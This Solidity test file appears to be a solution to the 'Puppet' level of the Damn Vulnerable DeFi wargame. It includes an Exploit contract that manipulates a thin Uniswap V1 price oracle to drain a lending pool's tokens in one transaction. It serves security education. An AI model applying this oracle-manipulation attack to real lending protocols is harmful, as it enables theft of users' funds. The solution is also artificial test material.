// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";

interface UniswapV1Exchange {
    function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
        external
        payable
        returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256);
}

interface UniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}

contract Puppet is Test {
    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 internal constant PLAYER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 internal constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    UniswapV1Exchange internal uniswapV1ExchangeTemplate;
    UniswapV1Exchange internal uniswapExchange;
    UniswapV1Factory internal uniswapV1Factory;

    DamnValuableToken internal dvt;
    PuppetPool internal puppetPool;
    address payable internal player;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        player = payable(address(uint160(uint256(keccak256(abi.encodePacked("player"))))));
        vm.label(player, "Player");
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        uniswapV1Factory = UniswapV1Factory(deployCode("./src/build-uniswap/v1/UniswapV1Factory.json"));

        // Deploy a exchange that will be used as the factory template
        uniswapV1ExchangeTemplate = UniswapV1Exchange(deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json"));

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        uniswapExchange = UniswapV1Exchange(uniswapV1Factory.createExchange(address(dvt)));
        vm.label(address(uniswapExchange), "Uniswap Exchange");

        // Deploy the lending pool
        puppetPool = new PuppetPool(address(dvt), address(uniswapExchange));
        vm.label(address(puppetPool), "Puppet Pool");

        // Add initial token and ETH liquidity to the pool
        dvt.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE, gas: 1e6}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE, // max_tokens
            block.timestamp * 2 // deadline
        );

        // Ensure Uniswap exchange is working as expected
        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(1 ether, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );

        // Setup initial token balances of pool and player account
        dvt.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetPool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        assertEq(puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
        assertEq(puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),POOL_INITIAL_TOKEN_BALANCE * 2);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

         // The first condition to pass this level is that player need to execute exactly 1 tx
         // We will have to do the attack with a contract, which will swap all the player's tokens for eth and almost empty the eth reserve of the exchange. Then will borrow all of the tokens from the pool at a discounted price and send everything to the player
        // To understand how to swap tokens, check the exchange and the factory contracts https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy
        Exploit exploit = new Exploit(dvt, uniswapExchange, puppetPool);

        // This will be the only transaction sent by the player which is to send PLAYER_INITIAL_TOKEN_BALANCE tokens to the exploit contract
        // We call setNonce to increase the player's nonce by 1. getNonce function doesnt seems to be working in a testing env.
        vm.prank(player);
        dvt.transfer(address(exploit), dvt.balanceOf(player));
        vm.setNonce(player, 1);

        // After swapping PLAYER_INITIAL_TOKEN_BALANCE for eth in the pool, the remaining eth in the exchange should be less than 0.1 eth.
        // We calculate how much should be deposited in order to empty the pool contract.
        uint256 oraclePrice = 0.1 ether * (10 ** 18) / (PLAYER_INITIAL_TOKEN_BALANCE + UNISWAP_INITIAL_TOKEN_RESERVE);
        uint256 depositRequired = POOL_INITIAL_TOKEN_BALANCE * oraclePrice * puppetPool.DEPOSIT_FACTOR() / 10 ** 18;

        // Finally execute the attack and empty the pool
        exploit.attack{value : depositRequired}(player);

        // Since the exploit was done from the test address and not the player's the nonce of the player remains 1.
        
         /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player executed a single transaction
        assertEq(vm.getNonce(player), 1);

        // Attacker has taken all tokens from the pool
        assertGe(dvt.balanceOf(player), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetPool)), 0);
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function calculateTokenToEthInputPrice(uint256 input_amount, uint256 input_reserve, uint256 output_reserve)
        internal pure
        returns (uint256)
    {
        uint256 input_amount_with_fee = input_amount * 997;
        uint256 numerator = input_amount_with_fee * output_reserve;
        uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
        return numerator / denominator;
    }
}


contract Exploit {
    DamnValuableToken dvt;
    UniswapV1Exchange uniswapExchange;
    PuppetPool puppetPool;
    address owner;

    uint256 internal constant PLAYER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    constructor(DamnValuableToken _dvt, UniswapV1Exchange _uniswapExchange, PuppetPool _puppetPool){
        owner = msg.sender;
        dvt = _dvt;
        puppetPool = _puppetPool;
        uniswapExchange = _uniswapExchange;
    }
 
    function attack(address player) external payable {
        require(msg.sender == owner);
        dvt.approve(address(uniswapExchange), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapExchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 9.9 ether, block.timestamp * 2);
        puppetPool.borrow{value : msg.value}(POOL_INITIAL_TOKEN_BALANCE, player);

        (bool success, ) = player.call{value : address(this).balance}("");
        require(success);
    }

    receive() external payable {}
}